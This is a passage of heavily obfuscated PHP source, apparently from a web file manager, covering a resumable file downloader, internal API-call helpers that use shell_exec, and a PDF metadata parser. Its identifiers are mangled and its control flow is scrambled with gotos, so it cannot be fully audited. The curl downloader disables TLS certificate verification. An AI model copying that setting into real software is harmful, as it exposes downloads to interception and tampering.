$bÎá≤ÕÜÜ¨) { $FÙäŸõÂì∏ =& $_SERVER[¯èãÄπµ]; $dúæºÓπñﬁ =& $this->task; $dúæºÓπñﬁ[$FÙäŸõÂì∏[1470]] = $dúæºÓπñﬁ[$FÙäŸõÂì∏[1469]]; $dúæºÓπñﬁ[$FÙäŸõÂì∏[1474]] += $dúæºÓπñﬁ[$FÙäŸõÂì∏[1469]]; $dúæºÓπñﬁ[$FÙäŸõÂì∏[1471]] = $FÙäŸõÂì∏[33]; $this->update(); } public function nameParse($dπÍÍì¡ΩÊ) { $dÔä®Íèüê =& $_SERVER[¯èãÄπµ]; $FèÇﬁü⁄ö” =& $this->task; if ($FèÇﬁü⁄ö”[$dÔä®Íèüê[992]] < $FèÇﬁü⁄ö”[$dÔä®Íèüê[980]]) { $BÂÀ›€ã∑Ü = get_path_this($dπÍÍì¡ΩÊ); if (strstr($BÂÀ›€ã∑Ü, $dÔä®Íèüê[91])) { $FèÇﬁü⁄ö”[$dÔä®Íèüê[992]] += 1; } } if ($FèÇﬁü⁄ö”[$dÔä®Íèüê[1492]] == $dÔä®Íèüê[1042]) { $FèÇﬁü⁄ö”[$dÔä®Íèüê[1492]] = $dÔä®Íèüê[297]; } $FèÇﬁü⁄ö”[$dÔä®Íèüê[1467]] = $dπÍÍì¡ΩÊ; $this->update(); } } class Downloader { static function start($c•π±ÏâÑÖ, $e≠‹çÆ¶≥Ç, $aµœè∑ Ø· = 10) { goto c±Œá∞Ë‹ê; DâÔ®ˆª◊ô: if (!$c•π±ÏâÑÖ) { return array($a¢πıåıëæ[1034] => !1, $a¢πıåıëæ[1036] => $a¢πıåıëæ[1039]); } if (!$DãØî≈÷–ﬂ[$a¢πıåıëæ[1285]] || $DãØî≈÷–ﬂ[$a¢πıåıëæ[321]] == 0) { @unlink($d⁄√Ãèàú∆); @unlink($e≠‹çÆ¶≥Ç); $BüÖ¶ÇöûÉ = self::fileDownloadFopen($c•π±ÏâÑÖ, $e≠‹çÆ¶≥Ç, $DãØî≈÷–ﬂ[$a¢πıåıëæ[321]]); if ($BüÖ¶ÇöûÉ[$a¢πıåıëæ[1034]]) { return $BüÖ¶ÇöûÉ; } else { @unlink($d⁄√Ãèàú∆); @unlink($e≠‹çÆ¶≥Ç); $BüÖ¶ÇöûÉ = self::fileDownloadCurl($c•π±ÏâÑÖ, $e≠‹çÆ¶≥Ç, !1, 0, $DãØî≈÷–ﬂ[$a¢πıåıëæ[321]]); @unlink($d⁄√Ãèàú∆); return $BüÖ¶ÇöûÉ; } } $a∆Èó˘¿º” = is_file($d⁄√Ãèàú∆) ? filesize($d⁄√Ãèàú∆) : 0; goto Eû∆≈¬ÁÀ˘; a÷˜ƒæî‰’: if ($BüÖ¶ÇöûÉ[$a¢πıåıëæ[1034]]) { @unlink($E•€πµå‚†); } return $BüÖ¶ÇöûÉ; goto dÊ¡”ñÑ¶Ñ; Eû∆≈¬ÁÀ˘: $a’ˆΩø®ﬂÿ = intval($DãØî≈÷–ﬂ[$a¢πıåıëæ[321]]); if (file_exists($d⁄√Ãèàú∆) && time() - filemtime($d⁄√Ãèàú∆) < 3) { return array($a¢πıåıëæ[1034] => !1, $a¢πıåıëæ[1036] => $a¢πıåıëæ[1499]); } $DŸº”–òÁ‘ = array(); goto b ÎÔ˜Çıç; b ÎÔ˜Çıç: if (is_file($E•€πµå‚†)) { $FúÑÙà¶ö‚ = file_get_contents($E•€πµå‚†); $DŸº”–òÁ‘ = json_decode($FúÑÙà¶ö‚, 1); } if (file_exists($e≠‹çÆ¶≥Ç) && $a’ˆΩø®ﬂÿ == filesize($e≠‹çÆ¶≥Ç)) { @unlink($d⁄√Ãèàú∆); @unlink($E•€πµå‚†); return array($a¢πıåıëæ[1034] => !0, $a¢πıåıëæ[1036] => $a¢πıåıëæ[1500]); } if ($DŸº”–òÁ‘[$a¢πıåıëæ[321]] != $a’ˆΩø®ﬂÿ) { $DŸº”–òÁ‘ = array($a¢πıåıëæ[321] => $a’ˆΩø®ﬂÿ); } goto b¢µÉƒ©◊ö; c±Œá∞Ë‹ê: $a¢πıåıëæ =& $_SERVER[¯èãÄπµ]; if (!request_url_safe($c•π±ÏâÑÖ)) { return array($a¢πıåıëæ[1034] => !1, $a¢πıåıëæ[1036] => $a¢πıåıëæ[1039]); } $E•€πµå‚† = $e≠‹çÆ¶≥Ç . $a¢πıåıëæ[1497]; goto EﬁËÿ√õÃ›; EﬁËÿ√õÃ›: $d⁄√Ãèàú∆ = $e≠‹çÆ¶≥Ç . $a¢πıåıëæ[1498]; if (is_array($c•π±ÏâÑÖ)) { $DãØî≈÷–ﬂ = $c•π±ÏâÑÖ; } else { $DãØî≈÷–ﬂ = url_header($c•π±ÏâÑÖ); } $c•π±ÏâÑÖ = $DãØî≈÷–ﬂ[$a¢πıåıëæ[291]]; goto DâÔ®ˆª◊ô; b¢µÉƒ©◊ö: if ($a∆Èó˘¿º” > $a’ˆΩø®ﬂÿ) { @unlink($d⁄√Ãèàú∆); } file_put_contents($E•€πµå‚†, json_encode($DŸº”–òÁ‘)); $BüÖ¶ÇöûÉ = self::fileDownloadCurl($c•π±ÏâÑÖ, $e≠‹çÆ¶≥Ç, !0, $a∆Èó˘¿º”, $a’ˆΩø®ﬂÿ); goto a÷˜ƒæî‰’; dÊ¡”ñÑ¶Ñ: } static function fileDownloadFopen($cÕﬂ•–»Üı, $b§Ôªßö÷∞, $BôŸ·∑∏¶Õ = 0) { $b‹É€ä√»› =& $_SERVER[¯èãÄπµ]; @ini_set($b‹É€ä√»›[1501], $b‹É€ä√»›[1502]); $D»öáÆÚö¿ = $b§Ôªßö÷∞ . $b‹É€ä√»›[1498]; set_timeout(); @unlink($D»öáÆÚö¿); if ($A–£ß”ä“ª = @fopen($cÕﬂ•–»Üı, $b‹É€ä√»›[1503])) { goto bÒ∫°œ€¯Ó; c¶§™ç»íÉ: fclose($A–£ß”ä“ª); $cµ ÀÏ∞í∏ = filesize(iconv_system($D»öáÆÚö¿)); if ($BôŸ·∑∏¶Õ != 0 && $cµ ÀÏ∞í∏ != $BôŸ·∑∏¶Õ) { return array($b‹É€ä√»›[1034] => !1, $b‹É€ä√»›[1036] => $b‹É€ä√»›[1507]); } goto d®èÀã≠á; d®èÀã≠á: self::checkGzip($D»öáÆÚö¿); if (!@rename($D»öáÆÚö¿, $b§Ôªßö÷∞)) { usleep(round(rand(0, 1000) * 50)); @unlink($b§Ôªßö÷∞); $bùÛË¿Âóº = @rename($D»öáÆÚö¿, $b§Ôªßö÷∞); if (!$bùÛË¿Âóº) { return array($b‹É€ä√»›[1034] => !1, $b‹É€ä√»›[1036] => $b‹É€ä√»›[1508]); } } return array($b‹É€ä√»›[1034] => !0, $b‹É€ä√»›[1036] => $b‹É€ä√»›[699]); goto díﬁÕ†ò∑’; bÒ∫°œ€¯Ó: if (!($aöäã∞Ÿﬁ· = @fopen($D»öáÆÚö¿, $b‹É€ä√»›[1504]))) { return array($b‹É€ä√»›[1034] => !1, $b‹É€ä√»›[1036] => $b‹É€ä√»›[1505]); } while (!feof($A–£ß”ä“ª)) { if (!file_exists($D»öáÆÚö¿)) { fclose($aöäã∞Ÿﬁ·); return array($b‹É€ä√»›[1034] => !1, $b‹É€ä√»›[1036] => $b‹É€ä√»›[1506]); } clearstatcache(); if ($BôŸ·∑∏¶Õ > 0 && $BôŸ·∑∏¶Õ == filesize(iconv_system($D»öáÆÚö¿))) { break; } fwrite($aöäã∞Ÿﬁ·, fread($A–£ß”ä“ª, 1024 * 8), 1024 * 8); } fclose($aöäã∞Ÿﬁ·); goto c¶§™ç»íÉ; díﬁÕ†ò∑’: } else { return array($b‹É€ä√»›[1034] => !1, $b‹É€ä√»›[1036] => $b‹É€ä√»›[1509]); } } static function fileDownloadCurl($cÛËØ≠ö’∏, $c∞åé≤äŒÇ, $eÌ”∆ßïÜΩ = false, $fÎÁﬂëüÏ¨ = 0, $D¡íµ ÜÌø = 0) { goto d‰ú®’∂Çã; A∞µ˜–è‡±: $C‚èÙ„ùà´ = @fopen($c¥ŒÑ†«Ûì, $Eáøáãøç¶[984]); if (!$C‚èÙ„ùà´) { return array($Eáøáãøç¶[1034] => !1, $Eáøáãøç¶[1036] => $Eáøáãøç¶[1510]); } $fœ≤ìË´»§ = curl_init($cÛËØ≠ö’∏); goto C…≠……°ﬁå; FŸ‹⁄÷◊Ø§: curl_setopt($fœ≤ìË´»§, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($fœ≤ìË´»§, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($fœ≤ìË´»§, CURLOPT_SSL_VERIFYHOST, 0); goto aÉŒ£—´‰Ë; Bû¢øŸëö“: curl_close($fœ≤ìË´»§); fclose($C‚èÙ„ùà´); $f≤ÂêŒÙçÓ = filesize(iconv_system($c¥ŒÑ†«Ûì)); goto Eìñ—çΩÏé; a™êÚƒåÜÇ: curl_setopt($fœ≤ìË´»§, CURLOPT_USERAGENT, $Eáøáãøç¶[1502]); $E≈˘¨™ƒ≈≈ = curl_exec($fœ≤ìË´»§); curl_progress_end($fœ≤ìË´»§); goto Bû¢øŸëö“; Eìñ—çΩÏé: if ($f≤ÂêŒÙçÓ < $D¡íµ ÜÌø && $D¡íµ ÜÌø != 0) { return array($Eáøáãøç¶[1034] => !1, $Eáøáãøç¶[1036] => $Eáøáãøç¶[1499]); } if ($f≤ÂêŒÙçÓ > $D¡íµ ÜÌø && $D¡íµ ÜÌø != 0) { return array($Eáøáãøç¶[1034] => !1, $Eáøáãøç¶[1036] => $Eáøáãøç¶[1507]); } if ($E≈˘¨™ƒ≈≈ && filesize($c¥ŒÑ†«Ûì) != 0) { self::checkGzip($c¥ŒÑ†«Ûì); if (!@rename($c¥ŒÑ†«Ûì, $c∞åé≤äŒÇ)) { @unlink($c∞åé≤äŒÇ); $E≈˘¨™ƒ≈≈ = @rename($c¥ŒÑ†«Ûì, $c∞åé≤äŒÇ); if (!$E≈˘¨™ƒ≈≈) { return array($Eáøáãøç¶[1034] => !1, $Eáøáãøç¶[1036] => $Eáøáãøç¶[1512]); } } return array($Eáøáãøç¶[1034] => !0, $Eáøáãøç¶[1036] => $Eáøáãøç¶[699]); } goto EÂä“º…÷™; C…≠……°ﬁå: if ($eÌ”∆ßïÜΩ) { curl_setopt($fœ≤ìË´»§, CURLOPT_RANGE, $fÎÁﬂëüÏ¨ . $Eáøáãøç¶[717]); } curl_setopt($fœ≤ìË´»§, CURLOPT_FILE, $C‚èÙ„ùà´); curl_setopt($fœ≤ìË´»§, CURLOPT_REFERER, get_url_link($cÛËØ≠ö’∏)); goto FŸ‹⁄÷◊Ø§; d‰ú®’∂Çã: $Eáøáãøç¶ =& $_SERVER[¯èãÄπµ]; $c¥ŒÑ†«Ûì = $c∞åé≤äŒÇ . $Eáøáãøç¶[1498]; set_timeout(); goto A∞µ˜–è‡±; EÂä“º…÷™: return array($Eáøáãøç¶[1034] => !1, $Eáøáãøç¶[1036] => $Eáøáãøç¶[1513]); goto c≥éºâ⁄ó∫; aÉŒ£—´‰Ë: curl_setopt($fœ≤ìË´»§, CURLOPT_NOPROGRESS, !1); curl_setopt($fœ≤ìË´»§, CURLOPT_PROGRESSFUNCTION, $Eáøáãøç¶[1511]); curl_progress_start($fœ≤ìË´»§); goto a™êÚƒåÜÇ; c≥éºâ⁄ó∫: } static function checkGzip($eá£äÓ°ÿë) { goto bíÂïáﬂÚ∂; B®à¢•≥”ß: file_put_contents($eá£äÓ°ÿë, $D–¥¶§ı“≤); goto aÑ´é£Ù¬—; bíÂïáﬂÚ∂: $dò‡«¿◊ À = $_SERVER[¯èãÄπµ][1514]; $bìÜËÿÃÖí = file_sub_str($eá£äÓ°ÿë, 0, 2); if ($dò‡«¿◊ À != $bìÜËÿÃÖí) { return; } goto Eﬂ¬ìùºÇÌ; Eﬂ¬ìùºÇÌ: ob_start(); readgzfile($eá£äÓ°ÿë); $D–¥¶§ı“≤ = ob_get_clean(); goto B®à¢•≥”ß; aÑ´é£Ù¬—: } } goto BÏ¢ºúöŒ∏; C©ı˘‘€ﬁ⁄: function ActionCall($F Û£ÈÑ¿â) { $få≈ô–Í±à = array_slice(func_get_args(), 1); return ActionApply($F Û£ÈÑ¿â, $få≈ô–Í±à); } function ActionCallApi($CºÚî≠ãíœ, $EôÂöëöÉﬁ = '') { goto a∫Ÿ§ÕäÜ∆; F”Â…ÿã–ƒ: $c ‹÷ÇòŸÇ = phpBinCommand(); if ($c ‹÷ÇòŸÇ && function_exists($F≠˘«¶çı∫[25])) { $cÊ·π√ûèÿ = $c ‹÷ÇòŸÇ . $F≠˘«¶çı∫[26] . BASIC_PATH . $F≠˘«¶çı∫[27] . escapeshellarg($CºÚî≠ãíœ); $Eã∞ıç¥ÀÜ = shell_exec($cÊ·π√ûèÿ); } if (!$Eã∞ıç¥ÀÜ) { $E‰»±ÙéÜõ = stream_context_create(array($F≠˘«¶çı∫[28] => array($F≠˘«¶çı∫[29] => 20, $F≠˘«¶çı∫[30] => $F≠˘«¶çı∫[31]))); $Eã∞ıç¥ÀÜ = file_get_contents(APP_HOST . $F≠˘«¶çı∫[32] . $CºÚî≠ãíœ, !1, $E‰»±ÙéÜõ); } goto cΩÌˆê»‡–; dåÕÌˆ‚Üï: return $AªÀ…éº•ﬁ; goto e‰·¯ô§·Ú; a∫Ÿ§ÕäÜ∆: $F≠˘«¶çı∫ =& $_SERVER[ÎÏ°ﬂ±å]; $DÌ˘†í≈ªÌ = $EôÂöëöÉﬁ; if (is_array($EôÂöëöÉﬁ)) { $DÌ˘†í≈ªÌ = $F≠˘«¶çı∫[20]; foreach ($EôÂöëöÉﬁ as $d≥ Ç¶»≥≈ => $AÓ˘”„Ó¯Ñ) { $AÓ˘”„Ó¯Ñ = is_array($AÓ˘”„Ó¯Ñ) ? json_encode($AÓ˘”„Ó¯Ñ) : $AÓ˘”„Ó¯Ñ; $AÓ˘”„Ó¯Ñ = is_bool($AÓ˘”„Ó¯Ñ) ? intval($AÓ˘”„Ó¯Ñ) : $AÓ˘”„Ó¯Ñ; $DÌ˘†í≈ªÌ .= $F≠˘«¶çı∫[21] . $d≥ Ç¶»≥≈ . $F≠˘«¶çı∫[22] . rawurlencode($AÓ˘”„Ó¯Ñ); } } goto FÆßÂŒ¶ŸØ; FÆßÂŒ¶ŸØ: $eë¬¿‹ﬂ¿– = Action($F≠˘«¶çı∫[23])->accessToken(); $CºÚî≠ãíœ = str_replace($F≠˘«¶çı∫[5], $F≠˘«¶çı∫[4], $CºÚî≠ãíœ) . $F≠˘«¶çı∫[24] . $eë¬¿‹ﬂ¿– . $DÌ˘†í≈ªÌ; $Eã∞ıç¥ÀÜ = $F≠˘«¶çı∫[20]; goto F”Â…ÿã–ƒ; cΩÌˆê»‡–: $Dé ‹≈øçæ = json_decode($Eã∞ıç¥ÀÜ, !0); $AªÀ…éº•ﬁ = is_array($Dé ‹≈øçæ) ? $Dé ‹≈øçæ : array($F≠˘«¶çı∫[33] => null, $F≠˘«¶çı∫[34] => $Eã∞ıç¥ÀÜ); if (!$Dé ‹≈øçæ) { echo $Eã∞ıç¥ÀÜ; } goto dåÕÌˆ‚Üï; e‰·¯ô§·Ú: } function ActionCallHook($b –‘∞ääò) { goto f†£†±˘∫ï; f†£†±˘∫ï: $f ﬂ›Û∆ı≥ =& $_SERVER[ÎÏ°ﬂ±å]; ob_start(); $E∆óÇ¨«Ñ∂ = array_slice(func_get_args(), 1); goto EàîÜèÔåì; C≥˜Òﬁ€ºà: $eµä©∞ãêÂ = $d∂∂º»¥ì ? json_decode($d∂∂º»¥ì, !0) : $eµä©∞ãêÂ; $GLOBALS[$f ﬂ›Û∆ı≥[35]] = 0; return $eµä©∞ãêÂ; goto aÉ—Ï÷ä•∞; EàîÜèÔåì: $GLOBALS[$f ﬂ›Û∆ı≥[35]] = 1; $eµä©∞ãêÂ = ActionApply($b –‘∞ääò, $E∆óÇ¨«Ñ∂); $d∂∂º»¥ì = ob_get_clean(); goto C≥˜Òﬁ€ºà; aÉ—Ï÷ä•∞: } goto C†ë∏†Ïı; BÏ¢ºúöŒ∏: class FileParsePdf { public static function parse($bê¯èÓÀß∂) { goto aŸ´ïà¯ˆµ; eˆﬁ—°¨àˆ: if ($d˜Ê–Íáë¥) { $fºêÑÕ∞ÂÖ[$aƒ®û’Éë∂[1331]] = $d˜Ê–Íáë¥[1]; } $fºêÑÕ∞ÂÖ[$aƒ®û’Éë∂[1523]] = 0; $Cíœ®Ò¯™¨ = $aƒ®û’Éë∂[1524]; goto eêì´√≤° ; cá˜Ò“åÔÉ: $Cíœ®Ò¯™¨ = $aƒ®û’Éë∂[1520]; preg_match($Cíœ®Ò¯™¨, $Dî≤≤Î√çÛ[$aƒ®û’Éë∂[1516]], $d˜Ê–Íáë¥); if (!$fºêÑÕ∞ÂÖ[$aƒ®û’Éë∂[1519]] && count($d˜Ê–Íáë¥) == 5) { $fºêÑÕ∞ÂÖ[$aƒ®û’Éë∂[1519]] = $d˜Ê–Íáë¥[3]; $fºêÑÕ∞ÂÖ[$aƒ®û’Éë∂[1521]] = $d˜Ê–Íáë¥[4]; } goto F©àÇÉÒÜµ; aƒÉ«Òà¯¿: if ($aÌ£≤≠‘‚¶) { $DÖœ∏˜æß° = $aÌ£≤≠‘‚¶[$aƒ®û’Éë∂[1518]][$aƒ®û’Éë∂[1188]]; $fºêÑÕ∞ÂÖ = self::getObjectValue($Dî≤≤Î√çÛ, $aÌ£≤≠‘‚¶, $DÖœ∏˜æß°); } $fºêÑÕ∞ÂÖ = is_array($fºêÑÕ∞ÂÖ) ? $fºêÑÕ∞ÂÖ : array(); $fºêÑÕ∞ÂÖ[$aƒ®û’Éë∂[1519]] = 0; goto cá˜Ò“åÔÉ; aŸ´ïà¯ˆµ: $aƒ®û’Éë∂ =& $_SERVER[¯èãÄπµ]; $Aã¢’ß‰˜æ = 32 * 1024; $Dî≤≤Î√çÛ = array($aƒ®û’Éë∂[778] => fopen($bê¯èÓÀß∂, $aƒ®û’Éë∂[1164]), $aƒ®û’Éë∂[75] => $bê¯èÓÀß∂, $aƒ®û’Éë∂[77] => filesize($bê¯èÓÀß∂), $aƒ®û’Éë∂[1515] => $Aã¢’ß‰˜æ); goto DÇ©ÓÒÂœ÷; A∑≤ÆÚà…©: if ($d˜Ê–Íáë¥[1] && $fºêÑÕ∞ÂÖ[$aƒ®û’Éë∂[1523]] < $d˜Ê–Íáë¥[1][0]) { $fºêÑÕ∞ÂÖ[$aƒ®û’Éë∂[1523]] = $d˜Ê–Íáë¥[1][0]; } $fºêÑÕ∞ÂÖ = self::parseInfoItem($fºêÑÕ∞ÂÖ); return $fºêÑÕ∞ÂÖ; goto a‘±á∞ÇÓÁ; DÇ©ÓÒÂœ÷: $Dî≤≤Î√çÛ[$aƒ®û’Éë∂[1516]] = StreamWrapperIO::read($bê¯èÓÀß∂, 0, $Aã¢’ß‰˜æ); $Dî≤≤Î√çÛ[$aƒ®û’Éë∂[1517]] = StreamWrapperIO::read($bê¯èÓÀß∂, $Dî≤≤Î√çÛ[$aƒ®û’Éë∂[77]] - $Aã¢’ß‰˜æ, $Aã¢’ß‰˜æ); $aÌ£≤≠‘‚¶ = self::decodeXref($Dî≤≤Î√çÛ); goto aƒÉ«Òà¯¿; F©àÇÉÒÜµ: preg_match($Cíœ®Ò¯™¨, $Dî≤≤Î√çÛ[$aƒ®û’Éë∂[1517]], $d˜Ê–Íáë¥); if (!$fºêÑÕ∞ÂÖ[$aƒ®û’Éë∂[1519]] && count($d˜Ê–Íáë¥) == 5) { $fºêÑÕ∞ÂÖ[$aƒ®û’Éë∂[1519]] = $d˜Ê–Íáë¥[3]; $fºêÑÕ∞ÂÖ[$aƒ®û’Éë∂[1521]] = $d˜Ê–Íáë¥[4]; } preg_match($aƒ®û’Éë∂[1522], $Dî≤≤Î√çÛ[$aƒ®û’Éë∂[1516]], $d˜Ê–Íáë¥); goto eˆﬁ—°¨àˆ; eêì´√≤° : preg_match_all($Cíœ®Ò¯™¨, $Dî≤≤Î√çÛ[$aƒ®û’Éë∂[1516]], $d˜Ê–Íáë¥); if ($d˜Ê–Íáë¥[1] && $fºêÑÕ∞ÂÖ[$aƒ®û’Éë∂[1523]] < $d˜Ê–Íáë¥[1][0]) { $fºêÑÕ∞ÂÖ[$aƒ®û’Éë∂[1523]] = $d˜Ê–Íáë¥[1][0]; } preg_match_all($Cíœ®Ò¯™¨, $Dî≤≤Î√çÛ[$aƒ®û’Éë∂[1517]], $d˜Ê–Íáë¥); goto A∑≤ÆÚà…©; a‘±á∞ÇÓÁ: } private static function parseInfoItem($Bë˘øµ»˜π) { $bÊ‹∏Ç ï§ =& $_SERVER[¯èãÄπµ]; if (!$Bë˘øµ»˜π) { return !1; } $CíÂ†ÿ’£ = array($bÊ‹∏Ç ï§[1332] => array($bÊ‹∏Ç ï§[1525], $bÊ‹∏Ç ï§[33]), $bÊ‹∏Ç ï§[1526] => array($bÊ‹∏Ç ï§[1527], $bÊ‹∏Ç ï§[33]), $bÊ‹∏Ç ï§[183] => array($bÊ‹∏Ç ï§[1528], $bÊ‹∏Ç ï§[206]), $bÊ‹∏Ç ï§[106] => array($bÊ‹∏Ç ï§[1529], $bÊ‹∏Ç ï§[206]), $bÊ‹∏Ç ï§[1523] => array($bÊ‹∏Ç ï§[1523], $bÊ‹∏Ç ï§[272]), $bÊ‹∏Ç ï§[1519] => array($bÊ‹∏Ç ï§[1519], $bÊ‹∏Ç ï§[272]), $bÊ‹∏Ç ï§[1521] => array($bÊ‹∏Ç ï§[1521], $bÊ‹∏Ç ï§[272]), $bÊ‹∏Ç ï§[1530] => array($bÊ‹∏Ç ï§[1531], $bÊ‹∏Ç ï§[33]), $bÊ‹∏Ç ï§[1532] => array($bÊ‹∏Ç ï§[1533], $bÊ‹∏Ç ï§[33]), $bÊ‹∏Ç ï§[1534] => array($bÊ‹∏Ç ï§[1331], $bÊ‹∏Ç ï§[33])); $AÕâì¡»√£ = array(); foreach ($CíÂ†ÿ’£ as $CÔ≤ú˘àÿú => $Fõò Ñ•À∞) { if (!isset($Bë˘øµ»˜π[$Fõò Ñ•À∞[0]])) { continue; } $bâõÖëÖ≠  = $Bë˘øµ»˜π[$Fõò Ñ•À∞[0]]; if (!$bâõÖëÖ≠  || is_array($bâõÖëÖ≠ )) { continue; } switch ($Fõò Ñ•À∞[1]) { case $bÊ‹∏Ç ï§[272]: $bâõÖëÖ≠  = intval($bâõÖëÖ≠ ); break; case $bÊ‹∏Ç ï§[206]: if (substr($bâõÖëÖ≠ , 0, 2) == $bÊ‹∏Ç ï§[1535]) { $bâõÖëÖ≠  = substr($bâõÖëÖ≠ , 2, 14); } if (strtotime($bâõÖëÖ≠ )) { $bâõÖëÖ≠  = date($bÊ‹∏Ç ï§[1536], strtotime($bâõÖëÖ≠ )); } break; } $AÕâì¡»√£[$CÔ≤ú˘àÿú] = $bâõÖëÖ≠ ; } return $AÕâì¡»√£; } private static function decodeXref(&$fé—ﬁ÷â≤ˆ) { goto A¯˘˜‹Ÿœ…; D‘ÖÛ ®∑ : if (preg_match($aß¡÷ìÙ§ú[1549], $aÎ‚åçæº€, $dô–ë®Ç√á) > 0) { $E≤‰®‚Éµâ[$aß¡÷ìÙ§ú[1518]][$aß¡÷ìÙ§ú[1188]] = intval($dô–ë®Ç√á[1]) . $aß¡÷ìÙ§ú[70] . intval($dô–ë®Ç√á[2]); } if (preg_match($aß¡÷ìÙ§ú[1550], $aÎ‚åçæº€, $dô–ë®Ç√á) > 0) { $E≤‰®‚Éµâ[$aß¡÷ìÙ§ú[1518]][$aß¡÷ìÙ§ú[363]] = array(); $E≤‰®‚Éµâ[$aß¡÷ìÙ§ú[1518]][$aß¡÷ìÙ§ú[363]][0] = $dô–ë®Ç√á[1]; $E≤‰®‚Éµâ[$aß¡÷ìÙ§ú[1518]][$aß¡÷ìÙ§ú[363]][1] = $dô–ë®Ç√á[2]; } if (!$E≤‰®‚Éµâ[$aß¡÷ìÙ§ú[1518]][$aß¡÷ìÙ§ú[1188]]) { return !1; } goto EâÖ†˜Ì·ﬁ; C∆éã∆é–ì: foreach ($dô–ë®Ç√á[3] as $CÃäêºÂÌ… => $Câç‡äèÑô) { if ($dô–ë®Ç√á[3][$CÃäêºÂÌ…] == $aß¡÷ìÙ§ú[1540]) { $CÉíúõÃ¢ˆ = $e—‘•ØÌ±∆ . $aß¡÷ìÙ§ú[70] . intval($dô–ë®Ç√á[2][$CÃäêºÂÌ…]); $E≤‰®‚Éµâ[$aß¡÷ìÙ§ú[1537]][$CÉíúõÃ¢ˆ] = intval($dô–ë®Ç√á[1][$CÃäêºÂÌ…]); ++$e—‘•ØÌ±∆; } else { if ($dô–ë®Ç√á[3][$CÃäêºÂÌ…] == $aß¡÷ìÙ§ú[1541]) { ++$e—‘•ØÌ±∆; } else { } } } if (preg_match_all($aß¡÷ìÙ§ú[1542], $c®Ñî◊Ùªª, $dô–ë®Ç√á)) { $A©âèÖ›Øî = $fé—ﬁ÷â≤ˆ[$aß¡÷ìÙ§ú[77]] - $fé—ﬁ÷â≤ˆ[$aß¡÷ìÙ§ú[1515]]; foreach ($dô–ë®Ç√á[0] as $CÃäêºÂÌ… => $f¿≠Ë¥™œä) { $BßÑ≥÷ÊÁ¥ = $dô–ë®Ç√á[1][$CÃäêºÂÌ…] . $aß¡÷ìÙ§ú[70] . $dô–ë®Ç√á[2][$CÃäêºÂÌ…]; $E≤‰®‚Éµâ[$aß¡÷ìÙ§ú[1537]][$BßÑ≥÷ÊÁ¥] = strpos($c®Ñî◊Ùªª, $f¿≠Ë¥™œä) + $A©âèÖ›Øî + 1; } } if (preg_match_all($aß¡÷ìÙ§ú[1543], $c®Ñî◊Ùªª, $dô–ë®Ç√á)) { $aÎ‚åçæº€ = count($dô–ë®Ç√á[1]) == 1 ? $dô–ë®Ç√á[1][0] : $dô–ë®Ç√á[1][1]; } else { $aÎ‚åçæº€ = substr($c®Ñî◊Ùªª, -1024 * 5); } goto fáô§∏ó¨ƒ; EâÖ†˜Ì·ﬁ: if (preg_match($aß¡÷ìÙ§ú[1551], $aÎ‚åçæº€, $dô–ë®Ç√á) > 0) { } return $E≤‰®‚Éµâ; goto BÑÜ¡º≈„Â; e‚Ö¬€ÍÒ‹: if ($fé—ﬁ÷â≤ˆ[$aß¡÷ìÙ§ú[77]] - $büµ¥µ⁄Í≠ > $fé—ﬁ÷â≤ˆ[$aß¡÷ìÙ§ú[1515]]) { $A∆êµ°ŸÉ„ = 4 * $fé—ﬁ÷â≤ˆ[$aß¡÷ìÙ§ú[1515]]; $fé—ﬁ÷â≤ˆ[$aß¡÷ìÙ§ú[1515]] = $A∆êµ°ŸÉ„; $fé—ﬁ÷â≤ˆ[$aß¡÷ìÙ§ú[1516]] = StreamWrapperIO::read($fé—ﬁ÷â≤ˆ[$aß¡÷ìÙ§ú[75]], 0, $A∆êµ°ŸÉ„); $fé—ﬁ÷â≤ˆ[$aß¡÷ìÙ§ú[1517]] = StreamWrapperIO::read($fé—ﬁ÷â≤ˆ[$aß¡÷ìÙ§ú[75]], $fé—ﬁ÷â≤ˆ[$aß¡÷ìÙ§ú[77]] - $A∆êµ°ŸÉ„, $A∆êµ°ŸÉ„); $c®Ñî◊Ùªª = $fé—ﬁ÷â≤ˆ[$aß¡÷ìÙ§ú[1517]]; } $e—‘•ØÌ±∆ = 0; preg_match_all($aß¡÷ìÙ§ú[1539], $c®Ñî◊Ùªª, $dô–ë®Ç√á); goto C∆éã∆é–ì; fáô§∏ó¨ƒ: if (preg_match($aß¡÷ìÙ§ú[1544], $aÎ‚åçæº€, $dô–ë®Ç√á) > 0) { $E≤‰®‚Éµâ[$aß¡÷ìÙ§ú[1518]][$aß¡÷ìÙ§ú[77]] = intval($dô–ë®Ç√á[1]); } if (preg_match($aß¡÷ìÙ§ú[1545], $aÎ‚åçæº€, $dô–ë®Ç√á) > 0) { $E≤‰®‚Éµâ[$aß¡÷ìÙ§ú[1518]][$aß¡÷ìÙ§ú[1546]] = intval($dô–ë®Ç√á[1]) . $aß¡÷ìÙ§ú[70] . intval($dô–ë®Ç√á[2]); } if (preg_match($aß¡÷ìÙ§ú[1547], $aÎ‚åçæº€, $dô–ë®Ç√á) > 0) { $E≤‰®‚Éµâ[$aß¡÷ìÙ§ú[1518]][$aß¡÷ìÙ§ú[1548]] = intval($dô–ë®Ç√á[1]) . $aß¡÷ìÙ§ú[70] . intval($dô–ë®Ç√á[2]); } goto D‘ÖÛ ®∑ ; A¯˘˜‹Ÿœ…: $aß¡÷ìÙ§ú =& $_SERVER[¯èãÄπµ]; $c®Ñî◊Ùªª = $fé—ﬁ÷â≤ˆ[$aß¡÷ìÙ§ú[1517]]; $E≤‰®‚Éµâ = array($aß¡÷ìÙ§ú[1518] => array(), $aß¡÷ìÙ§ú[1537] => array()); goto F˜Òˆª¥Ò‡; F˜Òˆª¥Ò‡: $b¡òÿçÜ‘” = $aß¡÷ìÙ§ú[1538]; if (!preg_match_all($b¡òÿçÜ‘”, $c®Ñî◊Ùªª, $dô–ë®Ç√á, PREG_SET_ORDER, 0)) { return !1; } $büµ¥µ⁄Í≠ = intval($dô–ë®Ç√á[0][1]); goto e‚Ö¬€ÍÒ‹; BÑÜ¡º≈„Â: } private static function getObjectValue($cı„“ºÜ£•, $B°ÚòΩèïÙ, $fà«å≈´ÓÇ) { goto AŒÔÙÿ≠≠´; a∏Á‡ëÚ±: if (!is_array($Cﬂü»›™ë∞[1])) { return array(); } $B£©∫‚∞¿≠ = array(); for ($açéù¿í°è = 0; $açéù¿í°è < count($Cﬂü»›™ë∞[1]); $açéù¿í°è += 2) 